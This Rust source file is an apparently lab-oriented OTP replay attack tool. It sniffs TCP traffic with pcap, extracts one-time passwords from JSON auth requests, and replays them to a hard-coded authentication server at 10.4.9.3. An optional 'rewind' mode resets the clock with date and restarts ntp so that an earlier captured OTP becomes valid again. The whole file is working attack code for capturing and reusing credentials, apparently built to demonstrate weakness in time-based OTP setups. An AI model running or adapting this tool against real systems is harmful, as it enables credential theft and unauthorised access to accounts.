use etherparse::{SlicedPacket, TransportSlice::Tcp};
use otpgen::{send_auth_request, AuthRequest};
use pcap::{Capture, Device};
use std::collections::HashSet;
use std::iter::FromIterator;
use std::process::Command;
use std::time::SystemTime;
use std::{thread, time};

fn rewind(target_time: u64) {
    // Go to the beginning of the time slice
    let slice_start = target_time - (target_time % 30);
    println!("Rewinding to {:?}", slice_start);
    Command::new("date")
        .arg("+%s")
        .arg("-s")
        .arg(format!("@{}", slice_start))
        .spawn()
        .expect("Could not set date.");
    Command::new("systemctl")
        .arg("restart")
        .arg("ntp")
        .spawn()
        .expect("Could not restart ntp service.");

    // Wait for the clock to settle on the target system
    thread::sleep(time::Duration::from_secs(5));
}

fn attack(otps: &Vec<(String, u64)>) {
    let raw_attack_mode: &str =
        &std::env::var("OTP_REPLAY_MODE").unwrap_or("immediate".to_string());
    match raw_attack_mode {
        "immediate" => {
            println!("Executing immediate replay attack");
            replay(otps.last().unwrap().0.to_string())
        }
        "rewind" => {
            if otps.len() == 2 {
                println!("Second OTP captured");
                let (otp, target_time) = otps.first().unwrap();
                println!("Rewinding time of auth server...");
                rewind(*target_time);
                println!("Time rewind complete. Executing replay attack with old OTP.");
                replay(otp.clone())
            } else {
                println!("Waiting for one more otp")
            }
        }
        _ => panic!("Replay mode not recognized. Must be `immediate` or `rewind`"),
    }
}

fn replay(otp: String) {
    let response_code = send_auth_request(&AuthRequest { otp }, "10.4.9.3");
    let authenticated = 200 <= response_code && response_code < 300;
    if authenticated {
        println!("SUCESSS: Replay attack worked!");
        std::process::exit(0);
    } else {
        panic!("FAILURE: Replay attack failed :(")
    }
}

fn main() {
    let mut captured_otps: Vec<(String, u64)> = Vec::new();

    let main_device = Device::lookup().unwrap();
    println!("Starting capture...");
    let mut cap = Capture::from_device(main_device)
        .unwrap()
        .timeout(1000) // Must be non-zero or it hangs :(
        .snaplen(65535) // Max packet size in bytes
        .open()
        .unwrap();
    println!("Capture initialized.");

    // We only care about tcp traffic
    println!("Setting tcp filter...");
    cap.filter("tcp and not port 22").unwrap();

    println!("Listening...");
    loop {
        match cap.next() {
            Ok(packet) => match SlicedPacket::from_ethernet(&packet.data) {
                Err(error) => println!("Error parsing packet: {:?}", error),
                Ok(sliced_packet) => {
                    match sliced_packet.transport {
                        Some(Tcp(_header)) => {
                            let body = std::str::from_utf8(sliced_packet.payload).unwrap_or("");
                            match serde_json::from_str(body) {
                                Ok(AuthRequest { otp }) => {
                                    println!("Captured OTP: {:?}", otp);
                                    let now = SystemTime::now()
                                        .duration_since(SystemTime::UNIX_EPOCH)
                                        .unwrap()
                                        .as_secs();
                                    // Only execute attacks for new tokens
                                    let seen: HashSet<&String> =
                                        HashSet::from_iter(captured_otps.iter().map(|x| &x.0));
                                    if !seen.contains(&otp) {
                                        captured_otps.push((otp, now));
                                        attack(&captured_otps);
                                    }
                                }
                                Err(_error) => (),
                            };
                        }
                        _ => println!("Non tcp header. That should not happen"),
                    };
                }
            },
            Err(_error) => (),
        }
    }
}
